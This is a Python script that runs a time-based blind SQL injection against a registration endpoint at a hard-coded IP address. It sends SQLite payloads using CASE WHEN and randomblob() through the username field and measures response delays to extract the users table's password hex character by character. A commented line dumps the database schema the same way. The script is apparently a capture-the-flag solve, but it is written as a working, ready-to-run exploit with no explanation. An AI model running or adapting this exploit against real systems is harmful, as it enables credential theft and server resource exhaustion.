import requests
import time
import random
dict = "1234567890ABCDEF~"
url = 'http://45.40.247.139:19815/register'
flag = '3938653332643838393932376162'
num = len(flag)+1
while True:
    for i in dict:
        # payload = ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba',6)) + "',(case when(substr((select hex(sql) from sqlite_master),{0},1)='{1}') then randomblob(300000000) else 0 end))--+".format(num,i)
        payload = ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba',6)) + "',(case when(substr((select hex(password) from users),1,{0})='{1}') then randomblob(300000000) else 0 end))--+".format(num,flag+i)
        data = {"username": payload, "password": "1","confirmPassword":"1"}
        start_time = time.time()
        resp = requests.post(url, data=data)
        end_time = time.time()
        spend_time = end_time - start_time
        # print(spend_time,i)
        if spend_time >= 2:
            flag += i
            print(flag)
            num += 1
            break
    if i == "~":
        exit("over")